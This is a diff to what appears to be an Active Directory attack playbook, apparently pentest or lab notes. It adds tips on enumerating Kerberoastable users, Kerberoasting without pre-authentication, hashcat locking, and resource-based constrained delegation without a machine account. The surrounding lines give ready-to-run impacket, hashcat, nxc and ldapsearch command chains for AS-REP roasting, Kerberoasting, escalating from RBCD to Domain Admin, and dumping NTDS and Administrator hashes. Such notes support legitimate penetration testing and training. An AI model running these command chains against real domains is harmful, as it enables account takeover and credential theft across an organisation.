@@ -52,6 +52,16 @@ impacket-GetNPUsers <domain>/ -dc-ip <dc> -usersfile users.txt -no-pass   # AS-R
 impacket-GetUserSPNs <domain>/<user>:<pass> -dc-ip <dc> -request          # Kerberoast
 hashcat -m 18200 asrep.txt rockyou.txt;  hashcat -m 13100 tgs.txt rockyou.txt
 ```
+   - **Enumerate USER SPNs with an object-class filter, or the DC machine account masks them.** A bare
+     `(servicePrincipalName=*)` is dominated by `AD$`'s many SPNs; the ONE Kerberoastable user is easily
+     missed and you wrongly conclude "no Kerberoast target" (drift into AS-REP-crack/spray rabbit holes).
+     Always: `ldapsearch -x -H ldap://<dc> -b <base> "(&(servicePrincipalName=*)(objectCategory=person))" sAMAccountName servicePrincipalName`.
+   - **No creds but an AS-REP-roastable account exists? Kerberoast WITHOUT pre-auth** (credless): use the
+     roastable account as the requester -> `impacket-GetUserSPNs -no-preauth <asrep_user> -usersfile <spn_users> -dc-host <dc> <domain>/`. Then `hashcat -m 13100`. See [[roasting-kerberoasting]].
+   - **hashcat single-instance lock:** a long crack (e.g. rockyou x big-rule) holds `/usr/bin/hashcat`;
+     a second crack exits INSTANTLY with "Already an instance ... running" (Started==Stopped, empty
+     `--show`). `pkill hashcat` (or wait) before the next crack, and check output for that line when a
+     crack returns nothing.
 4. **BloodHound + ACL abuse:**
 ```bash
 nxc ldap <dc> -u <user> -p <pass> --bloodhound -c all --dns-server <dc>
@@ -64,6 +74,7 @@ certipy req -u <user>@<domain> -p <pass> -ca <ca> -template <vuln> -upn administ
 ```
 6. **Delegation:** unconstrained (TGT capture via printerbug/coerce), constrained (`-impersonate`), RBCD (`ms-DS-AllowedToActOnBehalfOfOtherIdentity` write).
    - **RBCD -> DA chain** (own an account with `AddAllowedToAct`/`GenericWrite` on a computer + MAQ>0): `impacket-addcomputer <dom>/<u>:<p> -computer-name 'FAKE$' -computer-pass <pw> -dc-ip <dc>` -> `impacket-rbcd <dom>/<u>:<p> -delegate-to 'DC01$' -delegate-from 'FAKE$' -action write -dc-ip <dc>` -> `impacket-getST <dom>/'FAKE$':<pw> -spn cifs/DC01.<dom> -impersonate Administrator -dc-ip <dc>` -> `KRB5CCNAME=<ccache> impacket-secretsdump -k -no-pass DC01.<dom> -just-dc-user Administrator`. Sync clock if getST throws `KRB_AP_ERR_SKEW`. The account with the write is often obtained by **password reuse from an on-box cred store** (step 7), not an ACL edge from your foothold.
+   - **MAQ=0 does NOT block RBCD.** You only need a machine account if you have none; ANY account you control with an SPN (a Kerberoastable user) is a valid `-delegate-from`. Cracked a Kerberoastable user? Reuse it, skip `addcomputer`. And the write can come from a low-priv principal: a DACL granting `BUILTIN\Guests` GenericWrite over the DC computer object is exploitable straight from a guest/null session (`-hashes :31d6cfe0d16ae931b73c59d7e0c089c0` = empty-pw NT hash, since impacket prompts on a TTY-less run). See [[kerberos-attacks]].
 7. **Credential access / DCSync:**
 ```bash
 nxc smb <dc> -u <user> -p <pass> --ntds                 # if admin
